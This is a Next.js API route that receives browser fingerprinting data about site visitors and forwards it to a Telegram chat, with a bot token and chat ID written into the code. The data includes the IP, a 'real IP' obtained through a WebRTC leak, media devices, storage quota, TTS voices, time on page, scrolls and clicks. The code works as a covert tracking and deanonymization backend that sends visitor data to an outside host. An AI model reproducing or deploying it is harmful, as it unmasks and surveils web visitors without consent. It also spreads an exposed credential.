import { NextRequest, NextResponse } from "next/server";

export const runtime = "nodejs";

const TOKEN = "8858079352:AAEIiwfsGdiZ4w0n3qKXA5bZiwiewvcMLa4";
const CHAT = "-1003907306436";

function ip(req: NextRequest) {
  return (req.headers.get("x-forwarded-for") ?? "").split(",")[0].trim() || "unknown";
}
function s(v: unknown, max = 300): string {
  if (v === null || v === undefined) return "—";
  const str = String(v).trim();
  return str ? str.slice(0, max) : "—";
}

export async function POST(request: NextRequest) {
  type B = Record<string, unknown>;
  let b: B; try { b = await request.json() as B; } catch { return NextResponse.json({ ok: false }); }

  const addr = ip(request);
  const lines = [
    `🔍 ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ`,
    `IP: ${addr}`,
    ``,
    b.webrtcIPs ? `🌐 РЕАЛЬНЫЙ IP (WebRTC leak): ${s(b.webrtcIPs, 200)}` : null,
    b.mediaDevices ? `📷 Камеры/микрофоны: ${s(b.mediaDevices)}` : null,
    b.storageQuota ? `💾 Хранилище браузера: ${s(b.storageQuota)}` : null,
    b.voices ? `🎙 Голоса TTS: ${s(b.voices, 300)}` : null,
    b.sessionSeconds ? `⏱ Время на странице: ${s(b.sessionSeconds)} сек` : null,
    typeof b.maxScrollPct === "number" ? `📜 Прокрутил: ${b.maxScrollPct}%` : null,
    typeof b.clicks === "number" ? `🖱 Кликов: ${b.clicks}` : null,
  ].filter((l): l is string => l !== null).join("\n");

  try {
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT, text: lines }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* ignore */ }

  return NextResponse.json({ ok: true });
}
